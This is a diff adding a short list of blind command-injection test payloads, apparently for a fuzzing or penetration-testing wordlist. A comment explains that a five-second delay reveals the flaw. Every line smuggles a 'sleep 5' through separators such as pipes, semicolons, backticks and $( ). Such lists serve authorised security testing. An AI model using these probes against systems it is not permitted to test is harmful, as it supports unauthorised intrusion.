@@ -1,0 +1,19 @@
+# If you inject this command and the system takes about 5 second longer to return, 
+# then you probably have a command injection. 
+|sleep 5||`sleep 5` #&apos; |sleep 5||`sleep 5` 
+|sleep 5
+|`sleep 5’
+||`sleep 5` #\&quot; 
+||`sleep 5`
+#&apos; |sleep 5
+&sleep 5
+&`sleep 5`
+&&`sleep 5`
+|`sleep 5`
+'`sleep 5`'
+;sleep 5
+;`sleep 5`
+$(sleep 5)
+@{[system "sleep 5”]}
+#\&quot; |sleep 5
+&(sleep 5)
